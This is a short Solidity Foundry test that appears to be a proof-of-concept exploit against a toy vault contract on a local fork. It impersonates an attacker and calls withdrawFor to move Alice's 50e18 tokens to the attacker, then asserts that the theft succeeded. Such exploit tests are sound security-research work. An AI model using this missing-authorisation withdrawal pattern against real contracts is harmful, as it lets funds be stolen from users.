// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import {HyblisBase} from "./HyblisBase.sol";
import {Token, VaultImpl, Existing} from "../../src/Toy.sol";

contract HyblisPoC is HyblisBase {
    uint256 constant FORK_BLOCK = 40;
    VaultImpl constant VAULT = VaultImpl(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
    Token constant TOKEN = Token(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    address constant ALICE = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    address attacker;
    
    function setUp() public {
        vm.createSelectFork(vm.envString("HYBLIS_ETH_RPC"), FORK_BLOCK);
        attacker = makeAddr("attacker");
    }
    function test_exploit() public {
        vm.stopAndReturnStateDiff();
        vm.startPrank(attacker);
        VAULT.withdrawFor(ALICE, 50e18);
        vm.stopPrank();
        assertEq(TOKEN.balanceOf(attacker), 50e18);
    }
}
